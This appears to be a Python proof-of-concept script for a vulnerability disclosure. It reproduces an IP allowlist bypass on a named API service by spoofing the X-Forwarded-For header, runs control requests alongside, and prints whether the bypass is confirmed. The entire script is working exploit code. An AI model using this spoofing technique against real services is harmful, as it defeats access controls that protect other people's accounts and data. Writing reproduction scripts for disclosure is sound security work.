#!/usr/bin/env python3
"""Reproduce: Relay per-App IP allowlist is enforced against client-supplied X-Forwarded-For."""
import json, subprocess, sys, datetime

KEY = json.load(open('/home/ubuntu/.config/relay/keys.json'))['keys'][0]['apiKey']
ALLOWED = "203.0.113.7"          # the only IP present in App configuration.ips
V3 = "https://api.relay.link/requests/v3?limit=1"
METRICS = "https://api.relay.link/metrics/usage"


def call(url, xff=None):
    cmd = ["curl", "-s", "-m", "20", "-D", "/tmp/hh.txt", "-o", "/tmp/bb.txt",
           "-w", "%{http_code}", url, "-H", f"x-api-key: {KEY}"]
    if xff:
        cmd += ["-H", f"X-Forwarded-For: {xff}"]
    code = subprocess.run(cmd, capture_output=True, text=True).stdout.strip()
    body = open('/tmp/bb.txt', 'rb').read().decode(errors='replace')
    return code, body


def show(label, url, xff=None):
    code, body = call(url, xff)
    ts = datetime.datetime.utcnow().isoformat() + "Z"
    print(f"[{ts}] {label}")
    print(f"    GET {url}")
    print(f"    Header X-Forwarded-For: {xff if xff else '<absent>'}")
    print(f"    HTTP {code}")
    print(f"    Body: {body[:220].replace(chr(10),' ')}")
    print()
    return code


print("App IP allowlist =", ALLOWED, "(set through POST /api/integrator/apps -> configuration.ips)")
print("Request source IP = the host this script runs on (not the allowlisted address)")
print()
a = show("A. no spoofed header -> allowlist rejects", V3)
b = show("B. X-Forwarded-For set to the allowlisted IP -> accepted", V3, ALLOWED)
c = show("C. control: X-Forwarded-For set to a non-allowlisted IP -> rejected", V3, "8.8.8.8")
d = show("D. same bypass on an unrelated endpoint", METRICS, ALLOWED)
e = show("E. control: same endpoint without the header", METRICS)

print("RESULT:", "BYPASS CONFIRMED" if (a == "401" and b == "200" and c == "401" and e == "401") else "NOT REPRODUCED")